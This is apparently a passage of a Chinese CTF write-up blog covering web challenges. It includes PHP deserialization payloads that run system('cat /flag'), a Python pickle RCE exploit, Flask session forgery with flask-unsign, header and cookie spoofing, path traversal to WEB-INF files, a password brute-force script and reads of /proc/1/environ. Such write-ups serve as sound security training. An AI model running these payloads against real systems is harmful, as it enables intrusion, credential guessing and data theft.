+<p>只要让pswd&#x3D;escaping     payload里没有出现flag和php就行了</p>
+<p><img src="/../picture/image-20250410122809896.png" alt="image-20250410122809896"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:4:&quot;xxxx&quot;;s:4:&quot;pswd&quot;;s:8:&quot;escaping&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250410122856824.png" alt="image-20250410122856824"></p>
+<h3 id="嘿嘿嘿"><a href="#嘿嘿嘿" class="headerlink" title="嘿嘿嘿"></a>嘿嘿嘿</h3><p><img src="/../picture/image-20250410163205756.png" alt="image-20250410163205756"></p>
+<p>这题也是只需要让 $content&#x3D;GET_FLAG   即可</p>
+<p>只需要调用一下 hhh类  使$content&#x3D;GET_FLAG就行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hhh</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27;GET_FLAG&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> hhh;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250410164450485.png" alt="image-20250410164450485"></p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=O:3:&quot;hhh&quot;:2:&#123;s:4:&quot;file&quot;;N;s:7:&quot;content&quot;;s:8:&quot;GET_FLAG&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看源码  得到flag</p>
+<p><img src="/../picture/image-20250410164553368.png" alt="image-20250410164553368"></p>
+<p><img src="/../picture/image-20250410164603360.png" alt="image-20250410164603360"></p>
+<h3 id="伪装"><a href="#伪装" class="headerlink" title="伪装"></a>伪装</h3><p><img src="/../picture/image-20250413094533891.png" alt="image-20250413094533891"></p>
+<p>这是一个session伪造  sercert_key&#x3D;’love’   伪造cookie为：{“role”:{“is_admin”:1,”name”:”sjx”}}</p>
+<p>用flask-unsign伪造session</p>
+<p>建议用虚拟机linux环境跑   不知道为什么我windows上面跑不对</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --secret &#x27;love&#x27; --cookie &#x27;&#123;&quot;role&quot;:&#123;&quot;is_admin&quot;:1,&quot;name&quot;:&quot;sjx&quot;&#125;&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250413095707904.png" alt="image-20250413095707904"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session=eyJyb2xlIjp7ImlzX2FkbWluIjoxLCJuYW1lIjoic2p4In19.Z_sZvw.MgyBRSWXmTYXNF_ttEsQ8bdjkgo</span><br></pre></td></tr></table></figure>
+
+<p>然后传cookie里访问   &#x2F;admin路由就可以了</p>
+<p><img src="/../picture/image-20250413095934903.png" alt="image-20250413095934903"></p>
+<h3 id="Are-you-from-SQNU"><a href="#Are-you-from-SQNU" class="headerlink" title="Are you from SQNU?"></a>Are you from SQNU?</h3><p><img src="/../picture/image-20250413100028000.png" alt="image-20250413100028000"></p>
+<p><img src="/../picture/image-20250413100102831.png" alt="image-20250413100102831"></p>
+<p>打开源码可以发现get请求里有一个参数  tyctf</p>
+<p>小T说   请使用post方法   我们post传参就行</p>
+<p><img src="/../picture/image-20250413100157845.png" alt="image-20250413100157845"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tyctf=1&amp;hhh=abc</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250413100226195.png" alt="image-20250413100226195"></p>
+<p>修改请求头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">referer：https://sqnu-tysec.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250413100427309.png" alt="image-20250413100427309"></p>
+<p>修改</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user-agent：TYsecBrowser</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250413100453099.png" alt="image-20250413100453099"></p>
+<p>本地访问</p>
+<p>添加请求头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x-forwarded-for: 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250413100534543.png" alt="image-20250413100534543"></p>
+<p>改cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=admin</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="/../picture/image-20250413100623752.png" alt="image-20250413100623752"></p>
+<p><img src="/../picture/image-20250413100617186.png" alt="image-20250413100617186"></p>
+<h3 id="Look-for-the-homepag"><a href="#Look-for-the-homepag" class="headerlink" title="Look for the homepag"></a>Look for the homepag</h3><p><img src="/../picture/image-20250413112422669.png" alt="image-20250413112422669"></p>
+<p>打开devtool  查看网络栏目里可以发现一个challenge.php  访问</p>
+<p><img src="/../picture/image-20250413112509788.png" alt="image-20250413112509788"></p>
+<p><img src="/../picture/image-20250413112525788.png" alt="image-20250413112525788"></p>
+<h4 id="levle1"><a href="#levle1" class="headerlink" title="levle1"></a>levle1</h4><p>level1只需要   pass1  pass2  verify 不会空   pass2&#x3D;welcome 即可绕过  </p>
+<p>因为 if($verify_code &#x3D;&#x3D;&#x3D; $code &amp;&amp;$pass1 &#x3D;&#x3D;&#x3D; $flag || $pass2 &#x3D;&#x3D;&#x3D; “welcome”)</p>
+<p>前两个与后面pass2  直接只逻辑或的关系   只要后面成立该if即可为真</p>
+<h4 id="后面levle2"><a href="#后面levle2" class="headerlink" title="后面levle2"></a>后面levle2</h4><p>value1不为空   value3的md5  要等与$a[‘fly’]</p>
+<p>parse_str($value1,$a);<code>parse_str</code> 解析的是查询字符串，并将解析结果存入指定的数组 <code>$a</code>。</p>
+<p>会把$value1的值解析给$a这个数组</p>
+<p>即会导致  fly&#x3D;&gt;$value1</p>
+<p>所以我们只需要value1的值为value3的md5值即可   md5中又会将数组解析成空</p>
+<p>最终paylaod</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get：pass1=1&amp;verify=1&amp;pass2=welcome&amp;value3[]=1</span><br><span class="line"></span><br><span class="line">post: value1[]=1</span><br></pre></td></tr></table></figure>
+
+<p>我这里采用了数组绕过  让他们俩都为空</p>
+<p><img src="/../picture/image-20250413113537188.png" alt="image-20250413113537188"></p>
+<h3 id="file-download"><a href="#file-download" class="headerlink" title="file_download"></a>file_download</h3><p><img src="/../picture/image-20250413101423697.png" alt="image-20250413101423697"></p>
+<p><img src="/../picture/image-20250413101430797.png" alt="image-20250413101430797"></p>
+<p>访问 &#x2F;DownloadServlet</p>
+<p>get or post filename  这个参数</p>
+<p>因为这是一个文件下载的题   get传参是没办法进行下载的   post才可以下载</p>
+<p>这里先通过get filename  去访问一下WEB-INF&#x2F;web.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250413101702836.png" alt="image-20250413101702836"></p>
+<p>在这里可以看到 &#x2F;FlagManager这个路由  但是这个路由我们是没权限访问的</p>
+<p><img src="/../picture/image-20250413101820540.png" alt="image-20250413101820540"></p>
+<p>可以看到报405  get请求不允许  这里posy请求也是一样的</p>
+<p>然后在上面我们还发现了这个<strong>com.ctf.flag.FlagManager</strong>去访问一下</p>
+<p>WEB-INF&#x2F;classes&#x2F;com&#x2F;ctf&#x2F;flag&#x2F;FlagManager.class文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=WEB-INF/classes/com/ctf/flag/FlagManager.class</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250413102055002.png" alt="image-20250413102055002"></p>
+<p>可以看到显示class文件无法直接显示  所以我们使用post传参去下载</p>
+<p><img src="/../picture/image-20250413102129979.png" alt="image-20250413102129979"></p>
+<p>下载完去打开这个文件  发现好多乱码  这里也是卡了好久   最后发现这里面有  java   可能是一个需要反编译为java源码的class文件</p>
+<p><strong>JD-GUI</strong>：这是一个常用的图形化界面反编译工具，可以将 <code>.class</code> 文件反编译为 Java 源代码。</p>
+<p><strong>CFR</strong>：一个命令行工具，也可以将 <code>.class</code> 文件转换成源代码，支持新版本的 Java。</p>
+<p><strong>Procyon</strong>：另一个 Java 反编译器，支持较新的 Java 版本（Java 8 及更高版本）。</p>
+<p><strong>Jadx</strong>：主要用于 Android APK 反编译，但也可以反编译普通的 Java <code>.class</code> 文件。</p>
+<p><img src="/../picture/image-20250413102214875.png" alt="image-20250413102214875"></p>
+<p>这里我使用jadx进行反编译   可以发现就显示出了java源码</p>
+<p><img src="/../picture/image-20250413102622335.png" alt="image-20250413102622335"></p>
+<p>这里是</p>
+<p>Java 加密类 <code>FlagManager</code>，它的核心逻辑是：</p>
+<ol>
+<li>用户输入一个字符串。</li>
+<li>对字符串中的每个字符进行加密：<code>(字符ASCII值 + &#39;&amp;&#39;) ^ 48</code>。</li>
+<li>将加密结果与预定义的 <code>key</code> 数组比较，若一致则验证成功。</li>
+</ol>
+<p>目标是通过逆向加密算法，从 <code>key</code> 数组中还原出原始 flag。</p>
+<p>丢给ai也能直接出</p>
+<p><img src="/../picture/image-20250413103107083.png" alt="image-20250413103107083"></p>
+<p>加密算法逆向推导</p>
+<p>加密过程分为两步（对每个字符操作）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int result = (c + &#x27;&amp;&#x27;) ^ 48;</span><br></pre></td></tr></table></figure>
+
+<p>要逆向此过程，需反向操作：</p>
+<ol>
+<li><strong>逆向异或运算</strong>：异或（<code>^</code>）的逆运算仍是异或。例如，若 <code>A ^ B = C</code>，则 <code>C ^ B = A</code>。</li>
+<li><strong>逆向加法运算</strong>：加法（<code>+</code>）的逆运算是减法（<code>-</code>）。</li>
+</ol>
+<p>因此，解密公式为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原始字符 = ((加密数值 ^ 48) - &#x27;&amp;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>分步解密过程</p>
+<ol>
+<li><p><strong>获取密钥数组</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int[] key = &#123;110, 107, 185, 183, 183, 186, 103, 185, 99, 105, 105, 187, 105, 99, 102, 184, 185, 103, 99, 108, 186, 107, 187, 99, 183, 109, 105, 184, 102, 106, 106, 188, 109, 186, 111, 188&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>对每个数值解密</strong>：</p>
+<ul>
+<li>异或 48：<code>key[i] ^ 48</code></li>
+<li>减去 38（<code>&#39;&amp;&#39;</code>的ASCII值）：<code>(key[i] ^ 48) - 38</code></li>
+</ul>
+<p><strong>示例</strong>（以第一个数值 <code>110</code> 为例）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">110 ^ 48 = 78   // 二进制 1101110 ^ 00110000 = 01001110 (78)</span><br><span class="line">78 - 38 = 40    // 40 对应的 ASCII 字符是 &#x27;(&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>拼接所有字符</strong>：<br>对 <code>key</code> 数组中的每个数值重复上述操作，得到原始字符并拼接成字符串。</p>
+</li>
+</ol>
+<hr>
+<p>完整解密代码（Java）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class DecryptFlag &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        int[] key = &#123;110, 107, 185, 183, 183, 186, 103, 185, 99, 105, 105, 187, 105, 99, 102, 184, 185, 103, 99, 108, 186, 107, 187, 99, 183, 109, 105, 184, 102, 106, 106, 188, 109, 186, 111, 188&#125;;</span><br><span class="line">        StringBuilder flag = new StringBuilder();</span><br><span class="line">        </span><br><span class="line">        for (int encryptedValue : key) &#123;</span><br><span class="line">            // 逆向异或 48，再减去 38</span><br><span class="line">            int decryptedChar = (encryptedValue ^ 48) - 38;</span><br><span class="line">            flag.append((char) decryptedChar);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        // 输出格式为 flag&#123;...&#125;</span><br><span class="line">        System.out.println(&quot;flag&#123;&quot; + flag.toString() + &quot;&#125;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;85caad1c-33e3-0bc1-6d5e-a73b044f7d9f&#125;</span><br></pre></td></tr></table></figure>
+
+<p>即是正确的flag</p>
+<h3 id="自私的小s"><a href="#自私的小s" class="headerlink" title="自私的小s"></a>自私的小s</h3><p>我们查看cookie会发现有一个</p>
+<p>entrance&#x3D;%2Fend.php</p>
+<p>去访问end.php就行  进入反序列化的界面</p>
+<p><img src="/../picture/image-20250413103424707.png" alt="image-20250413103424707"></p>
+<p><img src="/../picture/image-20250413103536032.png" alt="image-20250413103536032"></p>
+<p>这里也就只要一个私有变量绕过   %是没有影响的  我们正常写poc就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Genshin_impact&#123;</span><br><span class="line">    private $value=&quot;system(&#x27;ls /&#x27;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Genshin_impact;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250413103938881.png" alt="image-20250413103938881"></p>
+<p>因为private  序列化之后 是  %00类名%00属性名  这里手动加上%00就行   s不用改   他包含着%00的字节大小了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：?payload=O:14:&quot;Genshin_impact&quot;:1:&#123;s:21:&quot;%00Genshin_impact%00value&quot;;s:15:&quot;system(&#x27;ls /&#x27;);&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250413104539598.png" alt="image-20250413104539598"></p>
+<p>得到根目录的flag文件   再cat &#x2F;flag就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload： ?payload=O:14:&quot;Genshin_impact&quot;:1:&#123;s:21:&quot;%00Genshin_impact%00value&quot;;s:20:&quot;system(&#x27;cat%20/flag&#x27;);&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250413104642349.png" alt="image-20250413104642349"></p>
+<h3 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h3><p><img src="/../picture/image-20250413105756527.png" alt="image-20250413105756527"></p>
+<p>py代码   运行将运行的payload提交就行</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (subprocess.check_output, ([<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;/flag&#x27;</span>],))</span><br><span class="line"></span><br><span class="line">payload = pickle.dumps(Exploit(), protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(payload).decode())</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250413105859684.png" alt="image-20250413105859684"></p>
+<p><img src="/../picture/image-20250413105947128.png" alt="image-20250413105947128"></p>
+<h3 id="无参之舞"><a href="#无参之舞" class="headerlink" title="无参之舞"></a>无参之舞</h3><p>因为按键基本都被禁了 </p>
+<p>所以我们抓包来看源码</p>
+<p><img src="/../picture/image-20250413110422308.png" alt="image-20250413110422308"></p>
+<p>这里的中文是</p>
+<p>&#x2F;* 儿时不懂这家传术法，要义怎是须斩断牵挂，不过初识这世间繁华，却要教我怎样告别他，七十五支残蜡，和七十六束火花，在指缝间留下，烫穿侥幸的年华，他们褪色的画，落成碑上的霜花，薪尽后将火传下，当赤团开出花，矗立在彼岸悬崖，花下奈落之底，身后灯火万家，当幽蝶飞向他，含笑将晚霞披挂，只盼望川奔流，稍回我牵挂，当死门风如鸦，归去何必惧怕，此去若化红梅，且向春山播撒，当命数已抵达，今日方觉我似他，来年若蝶归，替我吻向新芽，当离别开出花，裹着再见的谎话，总有少年攥紧，浸透生死的砂，万魂织就锦霞，轻抚千帆再归家，星槎载满月华，温暖了伤疤，当英雄开成花，绘出璃月繁华，他们笑而不语，却欣慰这回答，托举霄灯明霞，拂过青丝与白发，谁曾化春风，换人间春无涯。我才不会告诉你用户名是sqctf呢^_^！ *&#x2F;</p>
+<p>所以<strong>用户名就是sqctf</strong>   然后再进行一个弱口令爆破</p>
+<p>py代码</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录页面 URL</span></span><br><span class="line">url = <span class="string">&quot;http://challenge.qsnctf.com:31269/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户名</span></span><br><span class="line">username = <span class="string">&quot;sqctf&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于发送 POST 请求的 headers</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于登录表单的 payload</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取密码字典文件路径</span></span><br><span class="line">password_dict_file = <span class="string">r&quot;D:\ctf\字典\弱口令.txt&quot;</span>  <span class="comment"># 替换为你的字典文件路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开字典文件并逐行读取密码</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(password_dict_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    passwords = f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对每个密码进行尝试</span></span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> passwords:</span><br><span class="line">    password = password.strip()  <span class="comment"># 去除行末的换行符和空格</span></span><br><span class="line">    data[<span class="string">&quot;password&quot;</span>] = password  <span class="comment"># 更新密码</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, data=data, headers=headers, timeout=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 输出尝试的密码和返回的状态码</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;尝试密码: <span class="subst">&#123;password&#125;</span> - 状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查返回的页面是否包含错误信息或特定的标识</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;用户名或密码错误&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;密码错误: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;可能找到了正确的密码: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># 停止爆破，找到密码后退出</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;请求超时: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)  <span class="comment"># 如果请求超时，稍作等待后再试</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;请求发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250413110547933.png" alt="image-20250413110547933"></p>
+<p><strong>密码是1q2w3e4r</strong></p>
+<p>登录成功  是一个无参rce</p>
+<p><img src="/../picture/image-20250413110648096.png" alt="image-20250413110648096"></p>
+<p>先通过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(&#x27;.&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p>遍历一下本目录中的文件</p>
+<p><img src="/../picture/image-20250413110803018.png" alt="image-20250413110803018"></p>
+<p>发现有很多可能的flag文件</p>
+<p>我们试着读取就行了  读取用file_get_contents就可以</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(file_get_contents(&#x27;f1ag.php&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250413111124256.png" alt="image-20250413111124256"></p>
+<p>命令执行成功  查看源码获得flag</p>
+<p><img src="/../picture/image-20250413111149705.png" alt="image-20250413111149705"></p>
+<h3 id="千查万别"><a href="#千查万别" class="headerlink" title="千查万别"></a>千查万别</h3><p><img src="/../picture/image-20250413111543938.png" alt="image-20250413111543938"></p>
+<p>直接访问读取   &#x2F;proc&#x2F;1&#x2F;environ   获得flag</p>
+<p><img src="/../picture/image-20250413111622655.png" alt="image-20250413111622655"></p>
+<h3 id="ggoodd"><a href="#ggoodd" class="headerlink" title="ggoodd"></a>ggoodd</h3><p><img src="/../picture/image-20250413111711568.png" alt="image-20250413111711568"></p>
+<p>post:  id&#x3D;abc</p>
+<p>$_GET[‘json’]<code> 传入的 JSON 数据中，</code>x<code>键的值是</code>‘cba’</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post:id=abc</span><br><span class="line"></span><br><span class="line">get:?json=&#123;&quot;x&quot;:&quot;cba&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250413111959242.png" alt="image-20250413111959242"></p>
+<h3 id="开发人员的小失误"><a href="#开发人员的小失误" class="headerlink" title="开发人员的小失误"></a>开发人员的小失误</h3><p><img src="/../picture/image-20250413112114106.png" alt="image-20250413112114106"></p>
+<p>直接扫描就行了</p>
+<p><img src="/../picture/image-20250413112138986.png" alt="image-20250413112138986"></p>
+<p>有一个&#x2F;backup.sql 文件</p>
+<p>访问会下载该文件   打开得到flag</p>
+<p><img src="/../picture/image-20250413112222475.png" alt="image-20250413112222475"></p>
